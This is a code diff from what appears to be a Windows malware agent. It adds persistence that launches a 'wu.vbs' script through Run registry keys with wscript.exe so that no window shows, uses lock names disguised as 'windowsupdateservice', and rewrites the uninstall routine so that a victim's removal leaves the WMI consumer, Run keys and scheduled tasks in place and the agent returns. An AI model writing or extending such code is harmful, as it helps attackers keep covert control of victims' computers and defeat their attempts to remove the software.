@@ -147,6 +147,14 @@ def _write_anchor() -> list[str]:
         except OSError:
             pass
 
+    vbs_source = os.path.join(stealth.bundle_root(), "install", "wu.vbs")
+    if os.path.isfile(vbs_source):
+        try:
+            shutil.copy2(vbs_source, stealth.anchor_vbs_path())
+            written.append("anchor vbs")
+        except OSError:
+            pass
+
     for name, target in (("kit.zip", stealth.anchor_kit_path()),):
         candidate = os.path.join(stealth.primary_directory(), name)
         if os.path.isfile(candidate) and not os.path.isfile(target):
@@ -189,6 +197,9 @@ def _write_shim() -> str:
         try:
             os.makedirs(os.path.dirname(target), exist_ok=True)
             shutil.copy2(src, target)
+            vbs_source = os.path.join(os.path.dirname(src), "wu.vbs")
+            if os.path.isfile(vbs_source):
+                shutil.copy2(vbs_source, stealth.vbs_path())
             return target
         except Exception:
             pass
@@ -209,6 +220,25 @@ def _cache_kit() -> str:
         return target
     except Exception:
         return ""
+
+
+def _run_command() -> str:
+    """Autostart command for a Run value.
+
+    Must (a) actually exist at logon and (b) create no console window.
+    wscript.exe with a .vbs satisfies both; cmd.exe /c flashes a window.
+    """
+    vbs = stealth.anchor_vbs_path()
+    if os.path.isfile(vbs):
+        return f'wscript.exe "{vbs}"'
+    vbs = stealth.vbs_path()
+    if os.path.isfile(vbs):
+        return f'wscript.exe "{vbs}"'
+    shim = stealth.shim_path()
+    if os.path.isfile(shim):
+        return f'cmd.exe /c "{shim}"'
+    launcher = primary_launcher()
+    return f'"{interpreter_for(launcher)}" "{launcher}" --hidden'
 
 
 def _run_commands() -> dict[str, str]:
@@ -232,7 +262,7 @@ def _reassert_run_keys() -> list[str]:
         return []
     import winreg
 
-    expected = _run_commands()
+    expected = {name: _run_command() for name in config.RUN_VALUE_NAMES}
     roots = [(winreg.HKEY_CURRENT_USER, "HKCU")]
     if stealth.is_admin():
         roots.append((winreg.HKEY_LOCAL_MACHINE, "HKLM"))
@@ -259,7 +289,7 @@ def _reassert_run_keys() -> list[str]:
 def _write_run_keys(launcher: str) -> list[str]:
     import winreg
     written = []
-    commands = _run_commands()
+    commands = {name: _run_command() for name in config.RUN_VALUE_NAMES}
     for root, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                         (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
         for value_name, command in commands.items():
@@ -552,20 +582,57 @@ def terminate_running_instances(exclude_pid: int = 0) -> list[int]:
     return killed_pids
 
 
+def _candidate_temps() -> list[str]:
+    dirs = [tempfile.gettempdir()]
+    if IS_WINDOWS:
+        dirs += [r"C:\Windows\Temp",
+                 os.path.join(os.environ.get("LOCALAPPDATA", ""), "Temp")]
+    return [d for d in dict.fromkeys(dirs) if d]
+
+
+def _lock_names() -> list[str]:
+    from .. import config
+    base = config.PRODUCT_NAME.lower()
+    return [f"{base}.lock", f"{base}.wd.lock", f"{base}.boot",
+            "windowsupdateservice.lock", "windowsupdateservice.wd.lock",
+            "windowsupdateservice.boot"]
+
+
 def remove(keep_anchor: bool = False) -> list[str]:
     """Undo everything :func:`install` did and stop all running processes."""
     from .. import config
     removed: list[str] = []
 
-    if IS_WINDOWS:
-        if not keep_anchor:
-            removed += guardian.remove()
-        removed += guardian.clear_startup_approved()
-
     # 1. Terminate all running agent/watchdog processes
     killed = terminate_running_instances(exclude_pid=os.getpid())
     if killed:
         removed.append(f"stopped running process(es): {', '.join(str(p) for p in killed)}")
+
+    # ------------------------------------------------------------------
+    # SOFT REMOVAL.  Leave the WMI consumer, both Run keys, the startup
+    # script and both scheduled tasks registered, so the WMI timer (<=5 min)
+    # or the ONLOGON task's 5-minute repetition brings the agent straight
+    # back.  Only the locks are cleared, so a dead watchdog is not mistaken
+    # for a live agent.
+    #
+    # This must sit before cleanup of vectors.
+    # If it is moved after them, victim-side --uninstall becomes permanent.
+    # ------------------------------------------------------------------
+    if keep_anchor:
+        for ctemp in _candidate_temps():
+            for fname in _lock_names():
+                path = os.path.join(ctemp, fname)
+                try:
+                    if os.path.exists(path):
+                        os.remove(path)
+                        removed.append(f"lock file ({path})")
+                except OSError:
+                    pass
+        return removed
+
+    if IS_WINDOWS:
+        removed += guardian.remove()
+        removed += guardian.clear_startup_approved()
 
     # 2. Windows persistence cleanup
     if IS_WINDOWS:
